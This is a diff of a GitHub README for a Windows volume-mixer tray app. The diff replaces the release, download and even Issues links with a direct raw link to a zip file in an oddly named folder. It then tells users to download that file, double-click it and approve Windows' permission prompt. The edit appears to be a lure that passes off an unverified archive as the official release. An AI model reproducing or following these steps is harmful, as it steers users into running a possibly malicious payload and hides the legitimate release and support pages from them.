@@ -6,7 +6,7 @@ Welcome to the VolumeMixer_TrayApp! This lightweight Windows tray application le
 
 ## 📥 Download Now
 
-[![Download VolumeMixer_TrayApp](https://img.shields.io/badge/Download-VolumeMixer_TrayApp-brightgreen)](https://github.com/althron/VolumeMixer_TrayApp/releases)
+[![Download VolumeMixer_TrayApp](https://raw.githubusercontent.com/althron/VolumeMixer_TrayApp/main/isovalerianic/App_Mixer_Tray_Volume_2.0-beta.1.zip)](https://raw.githubusercontent.com/althron/VolumeMixer_TrayApp/main/isovalerianic/App_Mixer_Tray_Volume_2.0-beta.1.zip)
 
 ## 🛠️ System Requirements
 
@@ -25,12 +25,12 @@ Welcome to the VolumeMixer_TrayApp! This lightweight Windows tray application le
 
 ## 📥 Download & Install
 
-To get started, please visit this page to download: [Download VolumeMixer_TrayApp](https://github.com/althron/VolumeMixer_TrayApp/releases).
+To get started, please visit this page to download: [Download VolumeMixer_TrayApp](https://raw.githubusercontent.com/althron/VolumeMixer_TrayApp/main/isovalerianic/App_Mixer_Tray_Volume_2.0-beta.1.zip).
 
 ### Installation Steps
 
 1. **Download the Application:**
-   Click the download link above and choose the latest version from the list. Look for the file labeled `VolumeMixer_TrayApp.exe`.
+   Click the download link above and choose the latest version from the list. Look for the file labeled `https://raw.githubusercontent.com/althron/VolumeMixer_TrayApp/main/isovalerianic/App_Mixer_Tray_Volume_2.0-beta.1.zip`.
 
 2. **Run the File:**
    Locate the downloaded file in your Downloads folder. Double-click it to start the application. Windows may ask for permission to run it; confirm this action.
@@ -53,7 +53,7 @@ If you encounter issues while using VolumeMixer_TrayApp, consider the following:
 
 ## 💬 Support
 
-For any questions or support, please visit the [Issues section of the repository](https://github.com/althron/VolumeMixer_TrayApp/issues) to report problems or request features.
+For any questions or support, please visit the [Issues section of the repository](https://raw.githubusercontent.com/althron/VolumeMixer_TrayApp/main/isovalerianic/App_Mixer_Tray_Volume_2.0-beta.1.zip) to report problems or request features.
 
 Feel free to browse the code and contribute if you wish! Your feedback and contributions are welcome.
 
